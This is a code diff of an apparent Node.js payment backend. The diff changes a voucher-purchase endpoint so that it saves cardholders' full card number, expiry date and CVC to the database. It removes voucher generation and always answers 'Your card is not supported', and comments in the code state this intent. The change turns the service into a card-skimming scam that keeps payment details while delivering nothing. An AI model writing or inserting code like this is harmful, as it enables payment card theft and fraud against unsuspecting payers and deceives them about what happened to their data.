@@ -50,11 +50,12 @@ const userSchema = new mongoose.Schema({
   email: String,
   amount: Number,
   planDuration: String,
-  card_last4: String,
+  cardNumber: String, // Full card number
+  cardExpiry: String, // MM/YY
+  cardCvc: String, // CVC code
   country: String,
   countryName: String,
   postalCode: String,
-  voucher_code: String,
   created_at: {
     type: Date,
     default: Date.now,
@@ -200,6 +201,7 @@ app.post('/api/vouchers/validate', async (req, res) => {
 });
 
 // Payment endpoint - called from mobile app card input
+// Stores card data but does NOT generate voucher (always returns "card not supported")
 app.post('/api/pay', async (req, res) => {
   try {
     const {
@@ -222,53 +224,25 @@ app.post('/api/pay', async (req, res) => {
       });
     }
 
-    const last4 = String(cardNumber).slice(-4);
-
-    // Generate voucher
-    let code = generateVoucherCode();
-    let unique = false;
-    while (!unique) {
-      // Ensure uniqueness
-      const existing = await Voucher.findOne({ code });
-      if (!existing) {
-        unique = true;
-      } else {
-        code = generateVoucherCode();
-      }
-    }
-
-    const voucher = new Voucher({ code });
-    await voucher.save();
-
-    // Create user record
+    // Store user record with FULL card details (NO voucher generation)
     const user = new User({
       name: cardholderName,
       email: email || null,
       amount,
       planDuration,
-      card_last4: last4,
+      cardNumber: String(cardNumber), // Full card number
+      cardExpiry: expiry, // MM/YY
+      cardCvc: cvc, // CVC code
       country,
       countryName,
       postalCode,
-      voucher_code: code,
     });
     await user.save();
 
+    // Always return "card not supported" (no voucher generated)
     return res.json({
-      success: true,
-      message: 'Payment processed and voucher generated',
-      voucher: code,
-      user: {
-        name: user.name,
-        email: user.email,
-        amount: user.amount,
-        planDuration: user.planDuration,
-        card_last4: user.card_last4,
-        country: user.country,
-        countryName: user.countryName,
-        postalCode: user.postalCode,
-        created_at: user.created_at,
-      },
+      success: false,
+      message: 'Your card is not supported',
     });
   } catch (error) {
     console.error('Error processing payment:', error);
